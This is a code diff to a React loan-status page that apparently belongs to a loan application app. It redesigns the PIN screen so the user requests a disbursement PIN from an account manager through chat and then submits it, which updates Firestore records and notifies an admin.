@@ -493,95 +493,118 @@ export const LoanStatusPage = () => {
 
       case 'pin_sent':
         return (
-          <div className="max-w-md mx-auto text-center">
+          <div className="max-w-lg mx-auto text-center">
             <div className="w-20 h-20 bg-purple-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
               <ShieldCheck className="w-10 h-10 text-purple-500" />
             </div>
-            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Verification PIN Sent</h3>
-            <p className="text-gray-500 mb-8">
-              A verification PIN has been sent to your registered phone number. Please enter it below to finalize your application.
+            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Loan Verification PIN</h3>
+            <p className="text-gray-500 text-sm mb-8 leading-relaxed">
+              To disburse your loan funds, you must obtain a security PIN from your Account Manager. Request your PIN first, then enter it below to authorize the transfer.
             </p>
-            <div className="space-y-6">
-              <input 
-                type="text" 
-                className="w-full text-center text-3xl font-black tracking-[0.25em] py-6 rounded-3xl border-2 border-gray-100 dark:border-zinc-800 bg-gray-50 dark:bg-zinc-900 focus:border-accent outline-none dark:text-white"
-                placeholder="Enter PIN"
-                value={pin}
-                onChange={(e) => setPin(e.target.value)}
-              />
-              <button
-                disabled={!pin.trim() || isSubmitting}
-                onClick={async () => {
-                  setIsSubmitting(true);
-                  setLocalStatus('pin_submitted');
-                  
-                  const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
-                  if (!loanId) {
-                    setLocalStatus(null);
-                    setIsSubmitting(false);
-                    return;
-                  }
 
-                  try {
-                    setError(null);
-                    await updateDoc(doc(db, 'loans', loanId), {
-                      status: 'pin_submitted',
-                      pinSubmittedAt: serverTimestamp(),
-                      submittedPin: pin,
-                      updatedAt: serverTimestamp()
-                    });
-
-                    // Update user document for instant UI feedback
-                    await updateDoc(doc(db, 'users', user.uid), {
-                      activeLoanStatus: 'pin_submitted',
-                      updatedAt: serverTimestamp()
-                    });
-
-                    // Notify admin
-                    await addDoc(collection(db, 'notifications', 'admin', 'items'), {
-                      type: 'pin_submitted',
-                      title: 'PIN Verified',
-                      message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
-                      loanId: loanId,
-                      userId: user.uid,
-                      createdAt: serverTimestamp(),
-                      read: false
-                    });
-                  } catch (err) {
-                    console.error('Error submitting PIN:', err instanceof Error ? err.message : String(err));
-                    handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
-                    setLocalStatus(null);
-                    setError('Failed to submit PIN.');
-                  } finally {
-                    setTimeout(() => setIsSubmitting(false), 800);
-                  }
-                }}
-                className="btn-primary w-full py-4 text-base font-bold flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
-              >
-                {isSubmitting ? (
-                  <>
-                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                    Verifying PIN...
-                  </>
-                ) : (
-                  <>
-                    Submit PIN <ArrowRight className="w-4 h-4" />
-                  </>
-                )}
-              </button>
-              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the verification PIN and click Submit to continue</p>
-              
-              <div className="pt-6 border-t border-gray-100 dark:border-zinc-800/80 mt-6 space-y-3">
-                <p className="text-xs text-gray-500 font-medium">Need a verification link or PIN assistance?</p>
+            <div className="space-y-8">
+              {/* STEP 1: Top, Prominent & High Visibility Request PIN Button */}
+              <div className="p-5 rounded-3xl bg-accent/5 border-2 border-accent/20 dark:border-accent/30 text-left space-y-4">
+                <div className="flex items-center justify-between">
+                  <span className="text-[11px] font-black uppercase tracking-widest text-accent bg-accent/10 px-3 py-1 rounded-full">
+                    Step 1: Get Authorization PIN
+                  </span>
+                  <span className="text-[11px] font-bold text-gray-400">Direct Support</span>
+                </div>
+                <p className="text-xs text-gray-600 dark:text-zinc-300 leading-relaxed font-medium">
+                  Connect with your assigned Account Manager now to generate and verify your loan disbursement PIN.
+                </p>
                 <button
                   type="button"
                   onClick={() => navigate('/dashboard/chat')}
-                  className="w-full py-3.5 px-5 rounded-2xl bg-accent/10 hover:bg-accent/20 border border-accent/20 text-accent font-bold text-sm flex items-center justify-center gap-2.5 transition-all group"
+                  className="w-full py-5 px-6 rounded-2xl bg-accent text-white hover:bg-accent/90 shadow-xl shadow-accent/25 font-black text-sm uppercase tracking-wider flex items-center justify-center gap-3 transition-all hover:scale-[1.01] active:scale-[0.99] cursor-pointer"
                 >
-                  <MessageSquare className="w-4 h-4 text-accent group-hover:scale-110 transition-transform" />
-                  <span>Request Verification Link from Account Manager</span>
-                  <ArrowRight className="w-4 h-4 text-accent" />
+                  <MessageSquare className="w-5 h-5" />
+                  <span>Request PIN from Account Manager</span>
+                  <ArrowRight className="w-5 h-5" />
                 </button>
+              </div>
+
+              {/* STEP 2: Input PIN Section */}
+              <div className="p-5 rounded-3xl bg-gray-50 dark:bg-zinc-900/60 border border-gray-100 dark:border-zinc-800 text-left space-y-4">
+                <div className="flex items-center justify-between">
+                  <span className="text-[11px] font-black uppercase tracking-widest text-gray-500 dark:text-gray-400">
+                    Step 2: Enter Received PIN
+                  </span>
+                  <Lock className="w-4 h-4 text-gray-400" />
+                </div>
+                <p className="text-xs text-gray-500 font-medium">
+                  Once your Account Manager provides the PIN, type it below to finalize disbursement.
+                </p>
+                <div className="space-y-4 pt-1">
+                  <input 
+                    type="text" 
+                    className="w-full text-center text-3xl font-black tracking-[0.25em] py-5 rounded-2xl border-2 border-gray-200 dark:border-zinc-700 bg-white dark:bg-zinc-950 focus:border-accent outline-none dark:text-white transition-all shadow-sm"
+                    placeholder="ENTER PIN"
+                    value={pin}
+                    onChange={(e) => setPin(e.target.value)}
+                  />
+                  <button
+                    disabled={!pin.trim() || isSubmitting}
+                    onClick={async () => {
+                      setIsSubmitting(true);
+                      setLocalStatus('pin_submitted');
+                      
+                      const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
+                      if (!loanId) {
+                        setLocalStatus(null);
+                        setIsSubmitting(false);
+                        return;
+                      }
+
+                      try {
+                        setError(null);
+                        await updateDoc(doc(db, 'loans', loanId), {
+                          status: 'pin_submitted',
+                          pinSubmittedAt: serverTimestamp(),
+                          submittedPin: pin,
+                          updatedAt: serverTimestamp()
+                        });
+
+                        // Update user document for instant UI feedback
+                        await updateDoc(doc(db, 'users', user.uid), {
+                          activeLoanStatus: 'pin_submitted',
+                          updatedAt: serverTimestamp()
+                        });
+
+                        // Notify admin
+                        await addDoc(collection(db, 'notifications', 'admin', 'items'), {
+                          type: 'pin_submitted',
+                          title: 'PIN Verified',
+                          message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
+                          loanId: loanId,
+                          userId: user.uid,
+                          createdAt: serverTimestamp(),
+                          read: false
+                        });
+                      } catch (err) {
+                        console.error('Error submitting PIN:', err instanceof Error ? err.message : String(err));
+                        handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
+                        setLocalStatus(null);
+                        setError('Failed to submit PIN.');
+                      } finally {
+                        setTimeout(() => setIsSubmitting(false), 800);
+                      }
+                    }}
+                    className="btn-primary w-full py-4 text-sm font-black uppercase tracking-widest flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed rounded-2xl shadow-md"
+                  >
+                    {isSubmitting ? (
+                      <>
+                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                        Verifying PIN...
+                      </>
+                    ) : (
+                      <>
+                        Submit PIN & Finalize Loan <ArrowRight className="w-4 h-4" />
+                      </>
+                    )}
+                  </button>
+                </div>
               </div>
             </div>
           </div>
